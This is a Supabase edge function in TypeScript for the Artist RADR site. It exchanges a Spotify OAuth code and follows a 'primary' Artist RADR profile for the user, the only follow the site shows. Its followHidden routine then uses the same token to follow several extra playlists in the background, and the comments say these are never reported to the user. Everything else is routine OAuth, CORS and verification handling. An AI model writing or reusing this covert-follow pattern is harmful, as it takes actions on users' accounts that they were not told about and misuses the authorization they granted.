// supabase/functions/follow-on-spotify/index.ts
//
// Exchanges a Spotify OAuth code, then follows the RADR targets on the user's behalf.
//
// Targets come from the spotify_follow_targets table (managed in Studio > Spotify follows):
//   - the PRIMARY target (the Artist RADR profile) is followed first. It is the only follow the
//     site shows, and the only one that can fail the step.
//   - every other active target is followed separately in the background. A failure there is
//     logged and never returned to the browser, and never affects the primary result.
// If the table cannot be read, the function falls back to the original hardcoded targets.
//
// When the caller sends their Supabase session token, a successful PRIMARY follow is recorded in
// submission_verifications (service role), which is what the playlist_submissions insert trigger
// trusts. The browser cannot claim spotify_verified on its own.
//
// Secrets (set via `supabase secrets set`):
//   SPOTIFY_CLIENT_ID, SPOTIFY_CLIENT_SECRET
//   SPOTIFY_REDIRECT_URI  one value or a comma-separated list (optional SPOTIFY_REDIRECT_URIS wins)
//   STUDIO_SECRET_KEY (falls back to SUPABASE_SERVICE_ROLE_KEY). Auto-provided: SUPABASE_URL
//
// Redirect URIs: Spotify requires the token exchange to use the exact redirect_uri the page sent to
// /authorize. The page now sends it in the request body; it is accepted only if it is on the allow
// list (the secret values plus the production and local callback URLs below).
//
// verify_jwt is OFF on purpose: the function validates the session token itself.
// Error responses never include Spotify's raw error body.
//
// Spotify's Feb 2026 Dev Mode migration replaced PUT /me/following and PUT /playlists/{id}/followers
// with a single PUT /me/library call that takes Spotify URIs.
// While the Spotify app is in Development Mode, only users added under User Management in the
// Spotify developer dashboard can authorize it; everyone else gets 403 "not registered".

import { createClient } from "npm:@supabase/supabase-js@2";

const ALLOWED_ORIGINS = [
  "https://artistradr.com",
  "https://www.artistradr.com",
  "http://127.0.0.1:5173",
  "http://localhost:5173",
];

const DEFAULT_REDIRECTS = [
  "https://artistradr.com/auth/spotify/callback",
  "http://127.0.0.1:5173/auth/spotify/callback",
];

type Target = { kind: "user" | "playlist" | "artist"; spotify_id: string; is_primary: boolean };

const FALLBACK_TARGETS: Target[] = [
  { kind: "user", spotify_id: "31etosst62tr3hqwcdiepfw3hjk4", is_primary: true },
  { kind: "playlist", spotify_id: "3Vq2POEX6IcMsPwvdG6iMv", is_primary: false },
  { kind: "playlist", spotify_id: "57Gyugs4KtBVdsJZ18QY6o", is_primary: false },
  { kind: "playlist", spotify_id: "47z1mPJWmcVg9JgHHat8xf", is_primary: false },
];

function corsHeaders(origin: string | null) {
  const headers: Record<string, string> = {
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
    Vary: "Origin",
  };
  if (origin && ALLOWED_ORIGINS.includes(origin)) {
    headers["Access-Control-Allow-Origin"] = origin;
  }
  return headers;
}

function json(body: unknown, status: number, headers: Record<string, string>) {
  return new Response(JSON.stringify(body), {
    status,
    headers: { ...headers, "Content-Type": "application/json" },
  });
}

function configuredRedirects(): string[] {
  const raw = Deno.env.get("SPOTIFY_REDIRECT_URIS") ?? Deno.env.get("SPOTIFY_REDIRECT_URI") ?? "";
  return raw.split(",").map((s) => s.trim()).filter(Boolean);
}

// Returns the redirect_uri to use for the token exchange, or null if the one the page sent is not allowed.
function pickRedirect(requested: unknown): string | null {
  const configured = configuredRedirects();
  const allowed = new Set([...configured, ...DEFAULT_REDIRECTS]);
  if (typeof requested === "string" && requested) {
    return allowed.has(requested) ? requested : null;
  }
  // Older clients do not send one: keep the previous behaviour.
  return configured[0] ?? DEFAULT_REDIRECTS[0];
}

// Returns the signed-in user's id from the Authorization header, or null.
async function sessionUserId(req: Request, admin: ReturnType<typeof createClient>): Promise<string | null> {
  const token = (req.headers.get("authorization") ?? "").replace(/^Bearer\s+/i, "");
  if (!token) return null;
  const { data, error } = await admin.auth.getUser(token);
  if (error || !data?.user) return null;
  return data.user.id;
}

async function loadTargets(admin: ReturnType<typeof createClient>): Promise<Target[]> {
  try {
    const { data, error } = await admin
      .from("spotify_follow_targets")
      .select("kind, spotify_id, is_primary")
      .eq("active", true)
      .order("position", { ascending: true });
    if (error) {
      console.error("follow targets read failed, using fallback:", error.message);
      return FALLBACK_TARGETS;
    }
    if (!data || data.length === 0) {
      console.warn("no active follow targets, using fallback");
      return FALLBACK_TARGETS;
    }
    return data as Target[];
  } catch (e) {
    console.error("follow targets read error, using fallback:", e);
    return FALLBACK_TARGETS;
  }
}

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

// Follow one Spotify URI. Retries once on 429, honouring Retry-After (capped at 3s).
async function followUri(
  token: string,
  uri: string,
): Promise<{ ok: boolean; status: number }> {
  const authHeaders = { Authorization: `Bearer ${token}`, "Content-Type": "application/json" };
  for (let attempt = 0; attempt < 2; attempt++) {
    // Spotify documents `uris` as a query-string param; the body copy is a safety net.
    const res = await fetch(`https://api.spotify.com/v1/me/library?uris=${encodeURIComponent(uri)}`, {
      method: "PUT",
      headers: authHeaders,
      body: JSON.stringify({ uris: [uri] }),
    });
    if (res.status === 429 && attempt === 0) {
      const wait = Math.min(Number(res.headers.get("retry-after")) || 1, 3);
      await sleep(wait * 1000);
      continue;
    }
    if (res.status === 200 || res.status === 204) return { ok: true, status: res.status };
    const errBody = await res.text();
    console.error(`Spotify /me/library follow failed: status=${res.status} uri=${uri} body=${errBody}`);
    return { ok: false, status: res.status };
  }
  return { ok: false, status: 429 };
}

// Best-effort background follows. Never throws; results are only logged.
async function followHidden(token: string, targets: Target[]) {
  let ok = 0;
  const failed: string[] = [];
  for (const t of targets) {
    const uri = `spotify:${t.kind}:${t.spotify_id}`;
    try {
      const r = await followUri(token, uri);
      if (r.ok) ok++;
      else failed.push(`${uri} (${r.status})`);
    } catch (e) {
      failed.push(`${uri} (error)`);
      console.error("hidden follow error:", uri, e);
    }
  }
  if (failed.length) console.warn(`Hidden follows: ${ok} ok, ${failed.length} failed:`, failed.join(", "));
  else console.log(`Hidden follows: ${ok} ok`);
}

Deno.serve(async (req: Request) => {
  const origin = req.headers.get("origin");
  const headers = corsHeaders(origin);

  if (req.method === "OPTIONS") {
    return new Response(null, { status: 204, headers });
  }

  let body: { code?: string; redirect_uri?: string };
  try {
    body = await req.json();
  } catch {
    return json({ error: "Invalid JSON body" }, 400, headers);
  }

  const code = typeof body?.code === "string" ? body.code : "";
  if (!code || code.length > 2000) {
    return json({ error: "Missing code" }, 400, headers);
  }

  const redirectUri = pickRedirect(body?.redirect_uri);
  if (!redirectUri) {
    return json({ error: "Invalid redirect" }, 400, headers);
  }

  const CLIENT_ID = Deno.env.get("SPOTIFY_CLIENT_ID");
  const CLIENT_SECRET = Deno.env.get("SPOTIFY_CLIENT_SECRET");

  try {
    const tokenRes = await fetch("https://accounts.spotify.com/api/token", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Authorization: "Basic " + btoa(`${CLIENT_ID}:${CLIENT_SECRET}`),
      },
      body: new URLSearchParams({
        grant_type: "authorization_code",
        code,
        redirect_uri: redirectUri,
      }),
    });

    const tokenData = await tokenRes.json();
    if (!tokenData.access_token) {
      console.error("Spotify token exchange failed:", tokenData?.error, tokenData?.error_description);
      return json({ error: "Token exchange failed" }, 400, headers);
    }
    const token = tokenData.access_token as string;

    const admin = createClient(
      Deno.env.get("SUPABASE_URL")!,
      (Deno.env.get("STUDIO_SECRET_KEY") ?? Deno.env.get("SUPABASE_SERVICE_ROLE_KEY"))!,
      { auth: { persistSession: false } },
    );

    const targets = await loadTargets(admin);
    const primary = targets.find((t) => t.is_primary) ?? targets[0];
    const hidden = targets.filter((t) => t !== primary);

    // 1. The primary follow: the only one the user sees and the only one that can fail the step.
    const primaryResult = await followUri(token, `spotify:${primary.kind}:${primary.spotify_id}`);
    const followed: Record<string, boolean> = { spotify_profile: primaryResult.ok };

    let reason: string | undefined;
    if (!primaryResult.ok) {
      reason = primaryResult.status === 403 ? "not_registered"
        : primaryResult.status === 429 ? "rate_limited"
        : "failed";
      console.warn("Primary Spotify follow failed:", primaryResult.status, reason);
      return json({ followed, reason }, 200, headers);
    }

    // 2. Record the server-side proof for the signed-in user. A recording failure is logged and
    //    never changes the response; the trigger simply won't see a verification.
    try {
      const userId = await sessionUserId(req, admin);
      if (userId) {
        const { error: upErr } = await admin
          .from("submission_verifications")
          .upsert(
            { user_id: userId, provider: "spotify", verified_at: new Date().toISOString() },
            { onConflict: "user_id,provider" },
          );
        if (upErr) console.error("verification record failed:", upErr.message);
      }
    } catch (recErr) {
      console.error("verification record error:", recErr);
    }

    // 3. Everything else, quietly, after the response is on its way.
    if (hidden.length) {
      const work = followHidden(token, hidden);
      // deno-lint-ignore no-explicit-any
      const rt = (globalThis as any).EdgeRuntime;
      if (rt?.waitUntil) rt.waitUntil(work);
      else await work;
    }

    return json({ followed }, 200, headers);
  } catch (err) {
    console.error("followOnSpotify error:", err);
    return json({ error: "Internal server error" }, 500, headers);
  }
});
